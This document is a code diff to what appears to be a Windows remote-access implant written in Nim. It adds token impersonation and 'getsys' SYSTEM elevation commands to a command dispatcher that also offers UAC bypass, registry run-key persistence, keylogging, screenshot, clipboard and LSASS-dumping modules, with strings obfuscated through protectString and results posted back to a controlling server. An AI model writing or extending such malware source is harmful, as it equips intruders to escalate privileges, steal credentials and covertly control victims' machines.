@@ -2,9 +2,9 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv, token]
 # External imports
-import std/[tables, nativesockets, json]
+import std/[tables, nativesockets, json, strutils]
 import wAuto/[registry, window]
 import winim/[lean, com]
 import system/[io]
@@ -43,6 +43,7 @@ proc wrap_patch_func(func_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string): bool
+proc wrap_token_funcs(token_method: string, pid: int = 0): bool
 proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 proc wrap_set_critical(is_critical: bool): bool
@@ -521,6 +522,29 @@ proc uac_bypass(bypass_method: string, cmd: string): bool =
         return is_success_post
 
 
+proc wrap_token_funcs(token_method: string, pid: int = 0): bool =
+    var is_success: bool
+    var username: string
+
+    case token_method:
+        of protectString("impersonate"):
+            (is_success, username) = impersonate(pid)
+        of protectString("getsys"):
+            is_success = impersonate_system()
+            username = protectString("SYSTEM")
+        of protectString("rev2self"):
+            is_success = rev2self()
+            username = protectString("self")
+
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("impersonated"): username
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("token_method") , $data)
+    return is_success
+
+
 proc msgbox(title: string, text: string) {.gcsafe.} =
     # spawn in a new thread
     MessageBox(0, text, title, 0)
@@ -629,7 +653,6 @@ proc windows_start*(): void =
 proc windows_parse_command*(command: JsonNode): bool =
     var is_success: bool
     var command_type = command[protectString("command_type")].getStr()
-
     case command_type:
         # for external common procs - pass the http client as first argument
         of protectString("cmd"):
@@ -685,6 +708,13 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
         of protectString("uac-bypass"):
             is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
+        of protectString("impersonate"):
+            var pid = parseInt(command[protectString("pid")].getStr()) # For some fucking reason .getInt() here gets 0
+            is_success = wrap_token_funcs(command_type, pid)
+        of protectString("getsys"):
+            is_success = wrap_token_funcs(command_type)
+        of protectString("rev2self"):
+            is_success = wrap_token_funcs(command_type)
         of protectString("msgbox"):
             # spawn in a new thread
             var title = command[protectString("title")].getStr()
